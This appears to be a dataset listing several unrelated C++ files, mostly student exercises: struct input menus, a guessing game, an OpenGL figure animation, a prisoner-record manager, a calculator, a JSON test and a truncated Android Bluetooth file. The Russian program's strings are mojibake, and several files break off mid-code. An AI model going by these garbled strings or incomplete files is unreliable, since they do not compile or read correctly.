    "#include <iostream>  \n#include <string>  \nusing namespace std;\n\n\nstruct Clothes {\n\n    string name;\n    string gender;\n    string season;\n    int size;\n};\n\nstruct VideoGame {\n\n    string game_name;\n    string genre;\n    string publisher;\n    int duration;\n\n};\n\n\nint menu() {\n\n    int result;\n\n    do {\n        cout << \"\u00c2\u00fb\u00e1\u00e5\u00f0\u00e8\u00f2\u00e5 \u00ea\u00e0\u00ea\u00ee\u00e9 \u00ee\u00e1\u00fa\u00e5\u00ea\u00f2 \u00e2\u00fb \u00f5\u00ee\u00f2\u00e8\u00f2\u00e5 \u00e7\u00e0\u00ef\u00ee\u00eb\u00ed\u00e8\u00f2\u00fc \u00e8 \u00e2\u00fb\u00e2\u00e5\u00f1\u00f2\u00e8 \u00e2 \u00f2\u00e0\u00e1\u00eb\u00e8\u00f6\u00e5: \" << endl << \"1) \u00ce\u00e1\u00f3\u00e2\u00fc \" << endl << \"2) \u00c2\u00e8\u00e4\u00e5\u00ee\u00e8\u00e3\u00f0\u00e0 \" << endl << \"3) \u00ce\u00e1\u00e0 \u00ee\u00e1\u00fa\u00e5\u00ea\u00f2\u00e0 \" << endl << \"\u00c2\u00e0\u00f8 \u00e2\u00fb\u00e1\u00ee\u00f0 - \";\n        cin >> result;\n\n    } while (result > 3 or result < 0);\n\n    cout << \"\\n\";\n\n    return result;\n}\n\n\nvoid cloth_fill_info(Clothes& cloth) {\n\n    cout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00ed\u00e0\u00e7\u00e2\u00e0\u00ed\u00e8\u00e5 \u00ef\u00e0\u00f0\u00fb \u00ee\u00e1\u00f3\u00e2\u00e8: \";\n    cin >> cloth.name;\n\n    cout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00e3\u00e5\u00ed\u00e4\u00e5\u00f0 (\u00ec/\u00e6) : \";\n    cin >> cloth.gender;\n\n    cout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00f1\u00e5\u00e7\u00ee\u00ed: \";\n    cin >> cloth.season;\n\n    cout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00f0\u00e0\u00e7\u00ec\u00e5\u00f0: \";\n    cin >> cloth.size;\n\n    cout << endl;\n\n}\n\nvoid game_fill_info(VideoGame& game) {\n\n    cout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00ed\u00e0\u00e7\u00e2\u00e0\u00ed\u00e8\u00e5 \u00e8\u00e3\u00f0\u00fb: \";\n    cin >> game.game_name;\n\n    cout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00e6\u00e0\u00ed\u00f0 \u00e8\u00e3\u00f0\u00fb: \";\n    cin >> game.genre;\n\n    cout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00e8\u00e7\u00e4\u00e0\u00f2\u00e5\u00eb\u00ff \u00e8\u00e3\u00f0\u00fb: \";\n    cin >> game.publisher;\n\n    cout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00ef\u00f0\u00ee\u00e4\u00ee\u00eb\u00e6\u00e8\u00f2\u00e5\u00eb\u00fc\u00ed\u00ee\u00f1\u00f2\u00fc \u00e8\u00e3\u00f0\u00fb: \";\n    cin >> game.duration;\n\n    cout << \"\\n\\n\";\n\n}\n\n\nstring cloth_to_string(Clothes cloth) {\n\n    string result = \"\";\n\n    result += \"\u00d0\u00e0\u00e7\u00ec\u00e5\u00f0 -- \" + to_string(cloth.size) + \"\\n\";\n\n    return result;\n}\n\nstring game_to_string(VideoGame game) {\n\n    string result = \"\";\n\n    result += \"\u00cf\u00f0\u00ee\u00e4\u00ee\u00eb\u00e6\u00e8\u00f2\u00e5\u00eb\u00fc\u00ed\u00ee\u00f1\u00f2\u00fc \u00e8\u00e3\u00f0\u00fb -- \" + to_string(game.duration) + \"\\n\";\n\n    return result;\n}\n\n\nint main() {\n    setlocale(LC_ALL, \"ru\");\n\n    Clothes cloth;\n\n    cloth.name;\n    cloth.gender;\n    cloth.season;\n    cloth.size;\n\n    VideoGame game;\n\n    game.game_name;\n    game.genre;\n    game.publisher;\n    game.duration;\n\n    int x = menu();\n\n\n    if (x == 1) cloth_fill_info(cloth);\n\n    else if (x == 2) game_fill_info(game);\n\n    else {\n        cloth_fill_info(cloth);\n        game_fill_info(game);\n    }\n\n    cout << \"\u00d2\u00e0\u00e1\u00eb\u00e8\u00f6\u00e0 \u00f1 \u00ee\u00e1\u00fa\u00e5\u00ea\u00f2\u00ee\u00ec(-\u00e0\u00ec\u00e8):\" << \"\\n\\n\";\n\n    if (x == 1) cout << \"\u00cd\u00e0\u00e7\u00e2\u00e0\u00ed\u00e8\u00e5 \u00ef\u00e0\u00f0\u00fb \u00ee\u00e1\u00f3\u00e2\u00e8 -- \" << cloth.name << endl << \"\u00c3\u00e5\u00ed\u00e4\u00e5\u00f0 (\u00ec/\u00e6) -- \" << cloth.gender << \"\\n\" << \"\u00d1\u00e5\u00e7\u00ee\u00ed -- \" << cloth.season << \"\\n\" << cloth_to_string(cloth) << endl;\n\n    else if (x == 2)  cout << \"\u00cd\u00e0\u00e7\u00e2\u00e0\u00ed\u00e8\u00e5 \u00e8\u00e3\u00f0\u00fb -- \" << game.game_name << endl << \"\u00c6\u00e0\u00ed\u00f0 \u00e8\u00e3\u00f0\u00fb -- \" << game.genre << \"\\n\" << \"\u00c8\u00e7\u00e4\u00e0\u00f2\u00e5\u00eb\u00fc \u00e8\u00e3\u00f0\u00fb -- \" << game.publisher << \"\\n\" << game_to_string(game) << endl;\n\n    else {\n\n        cout << \"\u00cd\u00e0\u00e7\u00e2\u00e0\u00ed\u00e8\u00e5 \u00e2\u00e5\u00f9\u00e8 -- \" << cloth.name << endl << \"\u00c3\u00e5\u00ed\u00e4\u00e5\u00f0 (\u00ec/\u00e6) -- \" << cloth.gender << \"\\n\" << \"\u00d1\u00e5\u00e7\u00ee\u00ed -- \" << cloth.season << \"\\n\" << cloth_to_string(cloth) << \"\\n\\n\";\n        cout << \"\u00cd\u00e0\u00e7\u00e2\u00e0\u00ed\u00e8\u00e5 \u00e8\u00e3\u00f0\u00fb -- \" << game.game_name << endl << \"\u00c6\u00e0\u00ed\u00f0 \u00e8\u00e3\u00f0\u00fb -- \" << game.genre << \"\\n\" << \"\u00c8\u00e7\u00e4\u00e0\u00f2\u00e5\u00eb\u00fc \u00e8\u00e3\u00f0\u00fb -- \" << game.publisher << \"\\n\" << game_to_string(game) << \"\\n\\n\";\n    }\n\n\n\n\n    return 0;\n}\n \n/*\n\u00c4\u00ee\u00ec\u00e0\u00f8\u00ed\u00e5\u00e5 \u00e7\u00e0\u00e4\u00e0\u00ed\u00e8\u00e5:\n\n\u00cd\u00e0\u00ef\u00e8\u00f1\u00e0\u00f2\u00fc \u00f1\u00f2\u00f0\u00f3\u00ea\u00f2\u00f3\u00f0\u00fb \u00e4\u00eb\u00ff \u00f5\u00f0\u00e0\u00ed\u00e5\u00ed\u00e8\u00ff \u00e8\u00ed\u00f4\u00ee\u00f0\u00ec\u00e0\u00f6\u00e8\u00e8 \u00ee\n\n\n\u00ce\u00e4\u00e5\u00e6\u00e4\u00e5\n* \u00e5\u00b8 \u00ed\u00e0\u00e7\u00e2\u00e0\u00ed\u00e8\u00e8\n* \u00e3\u00e5\u00ed\u00e4\u00e5\u00f0\u00f3 (\u00cc, \u00c6, \u00e2\u00f1\u00e5\u00ec)\n* \u00f1\u00e5\u00e7\u00ee\u00ed\u00f3\n* \u00d0\u00e0\u00e7\u00ec\u00e5\u00f0\u00f3 (\u00e8\u00eb\u00e8 \u00f0\u00e0\u00e7\u00ec\u00e5\u00d0\u00c0\u00cc?)\n\n\u00ca\u00ee\u00ec\u00ef\u00fc\u00fe\u00f2\u00e5\u00f0\u00ed\u00ee\u00e9 \u00e8\u00e3\u00f0\u00e5\n* \u00cd\u00e0\u00e7\u00e2\u00e0\u00ed\u00e8\u00e5\n* \u00c6\u00e0\u00ed\u00f0\n* \u00c8\u00e7\u00e4\u00e0\u00f2\u00e5\u00eb\u00fc\n* \u00cf\u00f0\u00ee\u00e4\u00ee\u00eb\u00e6\u00e8\u00f2\u00e5\u00eb\u00fc\u00ed\u00ee\u00f1\u00f2\u00fc (\u00ed\u00e0\u00ef\u00f0\u00e8\u00ec\u00e5\u00f0, \u00ea\u00ee\u00eb\u00e8\u00f7\u00e5\u00f1\u00f2\u00e2\u00ee \u00f3\u00f0\u00ee\u00e2\u00ed\u00e5\u00e9 \u00e8 \u00f2.\u00e4.)\n\n\u00cd\u00e0\u00ef\u00e8\u00f1\u00e0\u00f2\u00fc \u00f4\u00f3\u00ed\u00ea\u00f6\u00e8\u00e8 \u00e4\u00eb\u00ff \u00ee\u00f2\u00ee\u00e1\u00f0\u00e0\u00e6\u00e5\u00ed\u00e8\u00ff \u00fd\u00f2\u00ee\u00e9 \u00e8\u00ed\u00f4\u00ee\u00f0\u00ec\u00e0\u00f6\u00e8\u00e8 \u00e2 \u00e2\u00e8\u00e4\u00e5 \u00f2\u00e0\u00e1\u00eb\u00e8\u00f6\u00fb\n\u00cd\u00e0\u00ef\u00e8\u00f1\u00e0\u00f2\u00fc \u00f4\u00f3\u00ed\u00ea\u00f6\u00e8\u00e8 \u00e4\u00eb\u00ff \u00e7\u00e0\u00ef\u00ee\u00eb\u00ed\u00e5\u00ed\u00e8\u00ff \u00f1\u00f2\u00f0\u00f3\u00ea\u00f2\u00f3\u00f0\u00fb. \u00ca\u00e0\u00ea \u00e1\u00f3\u00e4\u00e5\u00f2 \u00ef\u00e5\u00f0\u00e5\u00e4\u00e0\u00e2\u00e0\u00f2\u00fc\u00f1\u00ff \u00f1\u00f2\u00f0\u00f3\u00ea\u00f2\u00f3\u00f0\u00e0?*/",
    "//Guessing game, random cislo <1,100>, INPUT: tip pouzivatela, 7x pokusov, mensie alebo vacsie, urobte to ako cyklus\r\n#include <ctime>\r\n#include <iostream>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\n    char pokracovanie='a';\r\n    srand(time(NULL));\r\n    int random,tip;\r\n    int body=0;\r\n\r\n    while (pokracovanie=='a')\r\n    {\r\n        int uhadnute=0;\r\n        int i=0;\r\n        random = rand()%100+1;\r\n        cout<<endl<<random<<endl;\r\n\r\n        while ((uhadnute==0)&&(i<=6))\r\n        {\r\n\r\n            cout<<endl<<\"Zadajte Vas celociselny tip: \"<<endl;\r\n            cin>>tip;\r\n            if(tip==random)\r\n            {\r\n                cout<<endl<<\"Gratulujem, uhadli ste cislo, zadane cislo bolo: \"<<random<<endl;\r\n                uhadnute++;\r\n            }\r\n            else if(tip>random)\r\n            {\r\n                cout<<endl<<\"Hadane cislo je mensie ako ste zadali.\"<<endl;\r\n\r\n            }\r\n            else if(tip<random)\r\n            {\r\n                cout<<endl<<\"Hadane cislo je vacsie ako ste zadali\"<<endl;\r\n\r\n            }\r\n            i++;\r\n\r\n        }\r\n        if(uhadnute==0)\r\n        {\r\n            cout<<endl<<\"Neuhadli ste zadane cislo v 7 pokusoch\"<<endl;\r\n        }\r\n        if (uhadnute==1)\r\n        {\r\n            body=body+(8-i);\r\n\r\n        }\r\n        cout<<endl<<\"Pokial chcete zacat dalsiu hru zadajte: a; pokial nechcete pokracovat v hrani zadajte: n\"<<endl;\r\n        cin>>pokracovanie;\r\n    }\r\n    cout<<endl<<\"Vase finalne skore je: \"<<body;\r\n\r\n    return 0;\r\n}\r\n",
    "// GD-Praktikum:   teil_1_kamera.cpp  (Teil 2: Szenegraph und Animationen)\n\n#include <iostream> \n#include <GL/freeglut.h>         //l\u00e4dt alles f\u00fcr OpenGL\n\n#include \"Wuerfel.h\"\n\n\n\n//Global Variables for the Animation (Rotation) 40 max\nGLfloat MOVEMENT_SPEED = 1.5;\nGLfloat MOVEMENT_SPEED_ARM = 0.8;\n\nGLfloat RIGHT_UPPER_ARM = 20;\nGLfloat RIGHT_UNDER_ARM = 40;\nGLfloat LEFT_UPPER_ARM = -20;\nGLfloat LEFT_UNDER_ARM = 0;\nGLfloat RIGHT_LEG = -40;\nGLfloat LEFT_LEG = 40;\n\n\nbool RIGHT_LEG_FOWARD = true;\nbool LEFT_LEG_FOWARD = false;\nbool LEFT_UPPER_ARM_FOWARD = true;\nbool LEFT_UNDER_ARM_FOWARD = true;\nbool RIGHT_UPPER_ARM_FOWARD = false;\nbool RIGHT_UNDER_ARM_FOWARD = false;\n\n\n\n\n\nvoid Init()\n{\n\t// Hier finden jene Aktionen statt, die zum Programmstart einmalig \n\t// durchgef\u00fchrt werden m\u00fcssen\t\n\tglClearColor(0.6, 0.1, 0, 1);\n\tglEnable(GL_DEPTH_TEST);\n}\n\n\nvoid RenderScene() //Zeichenfunktion\n{\n\t// Hier befindet sich der Code der in jedem Frame ausgefuehrt werden muss\n\tglLoadIdentity();   // Aktuelle Model-/View-Transformations-Matrix zuruecksetzen\n\tglClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);\n\n\t// Kameraposition, Blickwinkel und Up-Vector\n\tgluLookAt(1., 1., 1., 0., 0., 0., 0., 1., 0.); // extrinsische Kameraparameter\n\n\n\t// Kopf\n\tglPushMatrix();\n\tglTranslatef(0.0, 0.5, 0);\n\tWuerfel(0.1, 0.1, 0.1);\n\tglPopMatrix();\n\n\n\t// Koerper\n\tglPushMatrix();\n\tglTranslatef(0.0, 0.2, 0);\n\tWuerfel(0.4, 0.5, 0.2);\n\tglPopMatrix();\n\n\n\t// Arm (links)\n\tglPushMatrix();\n\t// Rotation of whole arm (upper + lower)\n\tglTranslatef(0.25, 0.425, 0);\n\tglRotatef(LEFT_UPPER_ARM, 1, 0, 0);\n\tglTranslatef(-0.25, -0.425, 0);\n\t\n\t\t// Unterarm\n\t\tglPushMatrix();\n\t\t\tglTranslatef(0.25, 0.225, 0);\n\t\t\tglRotatef(LEFT_UNDER_ARM, 1, 0, 0);\n\t\t\tglTranslatef(-0.25, -0.225, 0);\n\n\n\t\t\tglTranslatef(0.25, 0.225, 0);\n\t\t\t//glRotatef(LEFT_UNDER_ARM, 1, 0, 0);\n\t\t\tWuerfel(0.08, 0.23, 0.1);\n\t\tglPopMatrix();\n\n\t// Oberarm\n\tglTranslatef(0.25, 0.425, 0);\n\tWuerfel(0.08, 0.1, 0.1);\n\tglPopMatrix();\n\n\n\t// Arm (rechts)\n\tglPushMatrix();\n\t// Rotation of whole arm (upper + lower)\n\tglTranslatef(0.25, 0.425, 0);\n\tglRotatef(RIGHT_UPPER_ARM, 1, 0, 0);\n\tglTranslatef(-0.25, -0.425, 0);\n\n\t\t// Unterarm\n\t\tglPushMatrix();\n\t\t\tglTranslatef(-0.25, 0.225, 0);\n\t\t\tglRotatef(RIGHT_UNDER_ARM, 1, 0, 0);\n\t\t\tglTranslatef(0.25, -0.225, 0);\n\n\t\t\tglTranslatef(-0.25, 0.225, 0);\n\t\t\tWuerfel(0.08, 0.23, 0.1);\n\t\tglPopMatrix();\n\n\t// Oberarm\n\tglTranslatef(-0.25, 0.425, 0);\n\tWuerfel(0.08, 0.1, 0.1);\n\tglPopMatrix();\n\n\n\n\t// Bein (links)\n\tglPushMatrix();\n\t// Rotation des Beines um die H\u00fcfle\n\tglTranslatef(0, -0.1, 0);\n\tglRotatef(LEFT_LEG, 1, 0, 0);\n\tglTranslatef(0, 0.1, 0);\n\n\tglTranslatef(0.15, -0.2, 0);\n\tWuerfel(0.08, 0.23, 0.1);\n\tglPopMatrix();\n\n\n\t// Bein (rechts)\n\tglPushMatrix();\n\t// Rotation des Beines um die H\u00fcfle\n\tglTranslatef(0, -0.1, 0);\n\tglRotatef(RIGHT_LEG, 1, 0, 0);\n\tglTranslatef(0, 0.1, 0);\n\n\t//glRotatef(-40, 1, 0, 0);\n\tglTranslatef(-0.15, -0.2, 0);\n\tWuerfel(0.08, 0.23, 0.1);\n\tglPopMatrix();\n\n\n\tglutSwapBuffers();\n}\n\n\nvoid Reshape(int width, int height)\n{\n\t// Hier finden die Reaktionen auf eine Ver\u00e4nderung der Gr\u00f6\u00dfe des \n\t// Graphikfensters statt\n\n\t // Matrix fuer Transformation: Frustum -> viewport\n\tglMatrixMode(GL_PROJECTION);\n\t// Aktuelle Transformations-Matrix zuruecksetzen\n\tglLoadIdentity();\n\t// Viewport definieren\n\tglViewport(0, 0, width, height);\n\t// Kamera definieren (intrinsische Kameraparameter)\n\t//glOrtho(-1., 1., -1., 1., 0., 10.); // orthogonale Kamera\n\tgluPerspective(45., 1, 0.1, 10.); // perspektivische Kamera\n\t// Matrix fuer Modellierung/Viewing\n\tglMatrixMode(GL_MODELVIEW);\n}\n\n\nvoid move() {\n\t// RIGHT LEG\n\tif (RIGHT_LEG_FOWARD) {\n\t\tRIGHT_LEG += MOVEMENT_SPEED;\n\t\tif (RIGHT_LEG >= 40) {\n\t\t\tRIGHT_LEG_FOWARD = false;\n\t\t}\n\t}\n\tif (!RIGHT_LEG_FOWARD) {\n\t\tRIGHT_LEG -= MOVEMENT_SPEED;\n\t\tif (RIGHT_LEG <= -40) {\n\t\t\tRIGHT_LEG_FOWARD = true;\n\t\t}\n\t}\n\n\t// LEFT LEG\n\tif (LEFT_LEG_FOWARD) {\n\t\tLEFT_LEG += MOVEMENT_SPEED;\n\t\tif (LEFT_LEG >= 40) {\n\t\t\tLEFT_LEG_FOWARD = false;\n\t\t}\n\t}\n\tif (!LEFT_LEG_FOWARD) {\n\t\tLEFT_LEG -= MOVEMENT_SPEED;\n\t\tif (LEFT_LEG <= -40) {\n\t\t\tLEFT_LEG_FOWARD = true;\n\t\t}\n\t}\n\n\n\t// LEFT UPPFER ARM\n\tif (LEFT_UPPER_ARM_FOWARD) {\n\t\tLEFT_UPPER_ARM += MOVEMENT_SPEED_ARM;\n\t\tif (LEFT_UPPER_ARM >= 20) {\n\t\t\tLEFT_UPPER_ARM_FOWARD = false;\n\t\t}\n\t}\n\tif (!LEFT_UPPER_ARM_FOWARD) {\n\t\tLEFT_UPPER_ARM -= MOVEMENT_SPEED_ARM;\n\t\tif (LEFT_UPPER_ARM <= -20) {\n\t\t\tLEFT_UPPER_ARM_FOWARD = true;\n\t\t}\n\t}\n\n\t// RIGHTEFT UPPFER ARM\n\tif (RIGHT_UPPER_ARM_FOWARD) {\n\t\tRIGHT_UPPER_ARM += MOVEMENT_SPEED_ARM;\n\t\tif (RIGHT_UPPER_ARM >= 20) {\n\t\t\tRIGHT_UPPER_ARM_FOWARD = false;\n\t\t}\n\t}\n\tif (!RIGHT_UPPER_ARM_FOWARD) {\n\t\tRIGHT_UPPER_ARM -= MOVEMENT_SPEED_ARM;\n\t\tif (RIGHT_UPPER_ARM <= -20) {\n\t\t\tRIGHT_UPPER_ARM_FOWARD = true;\n\t\t}\n\t}\n\n\t// LEFT UNDER ARM\n\tif (LEFT_UNDER_ARM_FOWARD) {\n\t\tLEFT_UNDER_ARM += MOVEMENT_SPEED_ARM;\n\t\tif (LEFT_UNDER_ARM >= 10) {\n\t\t\tLEFT_UNDER_ARM_FOWARD = false;\n\t\t}\n\t}\n\tif (!LEFT_UNDER_ARM_FOWARD) {\n\t\tLEFT_UNDER_ARM -= MOVEMENT_SPEED_ARM;\n\t\tif (LEFT_UNDER_ARM <= -40) {\n\t\t\tLEFT_UNDER_ARM_FOWARD = true;\n\t\t}\n\t}\n\n\t// RIGHT UNDER ARM\n\tif",
    "#include <iostream>\r\n#include <string>\r\n#include <cstdlib>\r\nusing namespace std;\r\n\r\nconst int MAX_NARAPIDANA = 3;\r\nconst int MAX_LOGIN_ATTEMPTS = 3;\r\n\r\nstruct Narapidana {\r\n  string nama;\r\n  string nomor_identifikasi;\r\n  string jenis_kejahatan;\r\n  string tanggal_masuk_penjara;\r\n  string jangka_waktu_hukuman;\r\n  string status_kesehatan;\r\n};\r\n\r\nstruct DataNarapidana {\r\n  int jumlah_narapidana = 0; \r\n  Narapidana* narapidana[MAX_NARAPIDANA];\r\n};\r\n\r\nDataNarapidana data_narapidana;\r\n\r\nbool login() {\r\n  int i = 0;\r\n  string nama, NIM;\r\n\r\n  while (i < MAX_LOGIN_ATTEMPTS) {\r\n    system(\"cls\");\r\n    cout << \"Masukkan nama: \";\r\n    getline(cin, nama); \r\n    cout << \"Masukkan NIM: \";\r\n    getline(cin, NIM); \r\n\r\n    if (nama.empty() || NIM.empty()) { \r\n      cout << \"Nama dan NIM tidak boleh kosong!\" << endl;\r\n      continue;\r\n    }\r\n\r\n    if (nama == \"Novita\" && NIM == \"2309106134\") {\r\n      cout << \"Selamat, login berhasil!\" << endl;\r\n      return true;\r\n    } else {\r\n      int remainingAttempts = MAX_LOGIN_ATTEMPTS - i - 1;\r\n      if (remainingAttempts > 0) {\r\n        cout << \"Maaf, login gagal. Nama atau NIM salah.\" << endl;\r\n        cout << \"Anda memiliki \" << remainingAttempts << \" kesempatan login tersisa.\" << endl;\r\n      } else {\r\n        cout << \"Maaf, login gagal. Batas percobaan login tercapai.\" << endl;\r\n        return false;\r\n      }\r\n      i++;\r\n    }\r\n  }\r\n\r\n  return false;\r\n}\r\n\r\nbool empty() {\r\n  return data_narapidana.jumlah_narapidana == 0;\r\n}\r\n\r\nvoid add(Narapidana* &ptrNarapidana) {\r\n  char loop;\r\n  do {\r\n    system(\"cls\");\r\n    if (data_narapidana.jumlah_narapidana < MAX_NARAPIDANA) {\r\n      ptrNarapidana = new Narapidana;\r\n\r\n      cin.ignore(); \r\n      cout << \"Masukkan nama narapidana: \";\r\n      getline(cin, ptrNarapidana->nama);\r\n      cout << \"Masukkan nomor identifikasi narapidana: \";\r\n      getline(cin, ptrNarapidana->nomor_identifikasi);\r\n      cout << \"Masukkan jenis kejahatan: \";\r\n      getline(cin, ptrNarapidana->jenis_kejahatan);\r\n      cout << \"Masukkan tanggal masuk penjara: \";\r\n      getline(cin, ptrNarapidana->tanggal_masuk_penjara);\r\n      cout << \"Masukkan jangka waktu hukuman: \";\r\n      getline(cin, ptrNarapidana->jangka_waktu_hukuman);\r\n      cout << \"Masukkan status kesehatan: \";\r\n      getline(cin, ptrNarapidana->status_kesehatan);\r\n\r\n      data_narapidana.narapidana[data_narapidana.jumlah_narapidana++] = ptrNarapidana;\r\n    } else {\r\n      cout << \"==DATA NARAPIDANA SUDAH PENUH==\" << endl;\r\n    }\r\n\r\n    cout << \"Tambahkan data narapidana lain (y/t): \";\r\n    cin >> loop;\r\n  } while (loop == 'y');\r\n}\r\n\r\nvoid display() {\r\n  if (!empty()) {\r\n    for (int i = 0; i < data_narapidana.jumlah_narapidana; ++i) {\r\n      cout << \"== Data Narapidana \" << i + 1 << \" ==\" << endl;\r\n      cout << \"Nama: \" << data_narapidana.narapidana[i]->nama << endl;\r\n      cout << \"Nomor Identifikasi: \" << data_narapidana.narapidana[i]->nomor_identifikasi << endl;\r\n      cout << \"Jenis Kejahatan: \" << data_narapidana.narapidana[i]->jenis_kejahatan << endl;\r\n      cout << \"Tanggal Masuk Penjara: \" << data_narapidana.narapidana[i]->tanggal_masuk_penjara << endl;\r\n      cout << \"Jangka Waktu Hukuman: \" << data_narapidana.narapidana[i]->jangka_waktu_hukuman << endl;\r\n      cout << \"Status Kesehatan: \" << data_narapidana.narapidana[i]->status_kesehatan << endl;\r\n    }\r\n  } else {\r\n    cout << \"==DATA NARAPIDANA KOSONG==\" << endl;\r\n  }\r\n}\r\n\r\nvoid edit() {\r\n  if (!empty()) {\r\n    char loop;\r\n    do {\r\n      system(\"cls\");\r\n      int index;\r\n      bool found = false;\r\n\r\n      cout << \"Masukkan nomor narapidana yang ingin diubah: \";\r\n      cin >> index;\r\n\r\n      if (index > 0 && index <= data_narapidana.jumlah_narapidana) {\r\n        index--; \r\n\r\n        Narapidana* ptrNarapidana = data_narapidana.narapidana[index];\r\n\r\n        cin.ignore(); \r\n        cout << \"Masukkan nama baru : \";\r\n        getline(cin, ptrNarapidana->nama);\r\n        cout << \"Masukkan nomor identifikasi baru : \";\r\n        getline(cin, ptrNarapidana->nomor_identifikasi);\r\n        cout << \"Masukkan jenis kejahatan baru : \";\r\n        getline(cin, ptrNarapidana->jenis_kejahatan);\r\n        cout << \"Masukkan tanggal masuk penjara baru : \";\r\n        getline(cin, ptrNarapidana->tanggal_masuk_penjara);\r\n        cout << \"Masukkan jangka waktu hukuman baru : \";\r\n        getline(cin, ptrNarapidana->jangka_waktu_hukuman);\r\n        cout << \"Masukkan status kesehatan baru : \";\r\n        getline(cin, ptrNarapidana->status_kesehatan);\r\n\r\n        cout << \"==Data narapidana berhasil diubah==\" << endl;\r\n        found = true;\r\n      } else {\r\n        cout << \"Nomor narapidana tidak ditemukan.\" << endl;\r\n      }\r\n\r\n      cout << \"Ubah data narapidana lain (y/t): \";\r\n      cin >> loop;\r\n    } while (loop == 'y');\r\n  } else {\r\n    system(\"cls\");\r\n    cout << \"==Data Narapidana kosong==\" << endl ;\r\n\t}\r\n}\r\n    \r\nvoid del() {\r\n  if (!empty()) {\r\n    char loop;\r\n    do {\r\n      system(\"cls\");\r\n      int index;\r\n      bool found = false;\r\n\r\n      cout << \"Masukkan nomor narapid",
    "#include <iostream>\n\nusing namespace std;\n\ndouble precio = 9.95;\n\nint main()\n{\n    //cout<< \"Compras\\n\";\n    //cout<< \"Dime cuantas unidades quieres comprar\\n\";\n    //int unidades;\n    //cin >> unidades;\n    //std::cout<<\"Hello World\";\n    \n    //double total= unidades * precio;\n    // descuento = true;\n    //char nombre = 'n';\n    //cout<< \"Bienvenido\" <<nombre<< \"\\n\";\n    //cout<< nombre;\n    //cout<< \"El total de la compra es:\"<<total;\n    \n    double num1;\n    double num2;\n    char operador;\n    int resultado;\n    cout<< \"Ingrese el num1\\n\";\n    cin>> num1;\n    cout<< \"Ingrese el num2\\n\";\n    cin>> num2;\n    cout<< \"Ingrese el operador\\n\";\n    cin>> operador;\n    \n    switch (operador){\n        case '+':\n            resultado = num1 + num2;\n            \n            break;\n        case '-':\n            resultado = num1 - num2;\n            \n            break;\n        case '*':\n            resultado = num1 * num2;\n            \n            break;\n        case '/':\n            if(num2 != 0){\n                resultado = num1 / num2;\n                \n            }else {\n                cout << \"Error: Divisi\u00f3n por cero.\";\n                return 1;\n            }\n            break;\n        \n    }\n    cout << \"El resultado de \" << num1 << \" \" << operador << \" \" << num2 << \" es: \" << resultado;\n    \n    return 0;\n}\n\n",
    "#include \"pch.h\"\n#include \"CppUnitTest.h\"\n\n#include <nlohmann/json.hpp>\n#include <iostream>\n#include <fstream> \n\nusing namespace Microsoft::VisualStudio::CppUnitTestFramework;\n\nnamespace nlohmann_json_tests\n{\n    struct Data {\n        std::string name;\n        int age;\n    };\n\n    // For serialization with macros (requires C++17)\n    void to_json(nlohmann::json& j, const Data& data) {\n        j = nlohmann::json{ {\"name\", data.name}, {\"age\", data.age} };\n    }\n\n    void from_json(const nlohmann::json& j, Data& data) {\n        j.at(\"name\").get_to(data.name);\n        j.at(\"age\").get_to(data.age);\n    }\n\n    int main() {\n        Data myData = { \"John Doe\", 30 };\n\n        nlohmann::json j = myData;\n        std::ofstream(\"data.json\") << j;\n\n        // Deserialization\n        std::ifstream(\"data.json\") >> j;\n        Data loadedData = j;\n        // ...\n\n        return 0;\n    }\n\n    TEST_CLASS(NLOHMANN_JSON_TESTS)\n    {\n    public:\n\n        TEST_METHOD(Example_Success)\n        {\n            Assert::AreEqual(0, main());\n        }\n    };\n}\n\n\n\n",
    "/*\n * Copyright (c) 2014 The Android Open Source Project\n * Copyright (C) 2012 The Android Open Source Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#define LOG_TAG \"BluetoothHeadsetClientServiceJni\"\n\n#include \"com_android_bluetooth.h\"\n#include \"hardware/bt_hf_client.h\"\n#include \"utils/Log.h\"\n\n#include <shared_mutex>\n\nnamespace android {\n\nstatic bthf_client_interface_t* sBluetoothHfpClientInterface = NULL;\nstatic std::shared_mutex interface_mutex;\n\nstatic jobject mCallbacksObj = NULL;\nstatic std::shared_mutex callbacks_mutex;\n\nstatic jmethodID method_onConnectionStateChanged;\nstatic jmethodID method_onAudioStateChanged;\nstatic jmethodID method_onVrStateChanged;\nstatic jmethodID method_onNetworkState;\nstatic jmethodID method_onNetworkRoaming;\nstatic jmethodID method_onNetworkSignal;\nstatic jmethodID method_onBatteryLevel;\nstatic jmethodID method_onCurrentOperator;\nstatic jmethodID method_onCall;\nstatic jmethodID method_onCallSetup;\nstatic jmethodID method_onCallHeld;\nstatic jmethodID method_onRespAndHold;\nstatic jmethodID method_onClip;\nstatic jmethodID method_onCallWaiting;\nstatic jmethodID method_onCurrentCalls;\nstatic jmethodID method_onVolumeChange;\nstatic jmethodID method_onCmdResult;\nstatic jmethodID method_onSubscriberInfo;\nstatic jmethodID method_onInBandRing;\nstatic jmethodID method_onLastVoiceTagNumber;\nstatic jmethodID method_onRingIndication;\nstatic jmethodID method_onUnknownEvent;\n\nstatic jbyteArray marshall_bda(const RawAddress* bd_addr) {\n  CallbackEnv sCallbackEnv(__func__);\n  if (!sCallbackEnv.valid()) return NULL;\n\n  jbyteArray addr = sCallbackEnv->NewByteArray(sizeof(RawAddress));\n  if (!addr) {\n    ALOGE(\"Fail to new jbyteArray bd addr\");\n    return NULL;\n  }\n  sCallbackEnv->SetByteArrayRegion(addr, 